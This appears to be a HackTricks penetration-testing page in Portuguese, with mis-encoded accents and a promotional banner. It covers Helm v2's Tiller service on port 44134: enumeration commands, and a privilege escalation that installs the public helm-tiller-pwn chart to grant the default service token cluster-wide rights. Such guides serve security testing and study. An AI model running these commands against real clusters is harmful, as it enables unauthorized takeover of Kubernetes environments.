<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>


# Informa√ß√£o B√°sica

Helm √© o **gerenciador de pacotes** para Kubernetes. Ele permite empacotar arquivos YAML e distribu√≠-los em reposit√≥rios p√∫blicos e privados. Esses pacotes s√£o chamados de **Helm Charts**. **Tiller** √© o **servi√ßo** **executado** por padr√£o na porta 44134 oferecendo o servi√ßo.

**Porta padr√£o:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# Enumera√ß√£o

Se voc√™ pode **enumerar pods e/ou servi√ßos** de diferentes namespaces, enumere-os e procure por aqueles com **"tiller" em seus nomes**:
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
Exemplos:
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
Voc√™ tamb√©m pode tentar encontrar este servi√ßo em execu√ß√£o verificando a porta 44134:
```bash
sudo nmap -sS -p 44134 <IP>
```
Depois de descobri-lo, voc√™ pode se comunicar com ele baixando o aplicativo cliente helm. Voc√™ pode usar ferramentas como `homebrew`, ou consultar [**a p√°gina oficial de lan√ßamentos**](https://github.com/helm/helm/releases)**.** Para mais detalhes, ou outras op√ß√µes, consulte [o guia de instala√ß√£o](https://v2.helm.sh/docs/using\_helm/#installing-helm).

Em seguida, voc√™ pode **enumerar o servi√ßo**:
```
helm --host tiller-deploy.kube-system:44134 version
```
## Escala√ß√£o de Privil√©gio

Por padr√£o, o **Helm2** foi instalado no **namespace kube-system** com **privil√©gios elevados**, ent√£o se voc√™ encontrar o servi√ßo e tiver acesso a ele, isso poder√° permitir que voc√™ **eleve os privil√©gios**.

Tudo que voc√™ precisa fazer √© instalar um pacote como este: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn) que dar√° ao **token de servi√ßo padr√£o acesso a tudo no cluster inteiro**.
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
Em [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573) voc√™ tem a **explica√ß√£o do ataque**, mas basicamente, se voc√™ ler os arquivos [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) e [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) dentro de _helm-tiller-pwn/pwnchart/templates/_ voc√™ pode ver como **todos os privil√©gios est√£o sendo concedidos ao token padr√£o**.
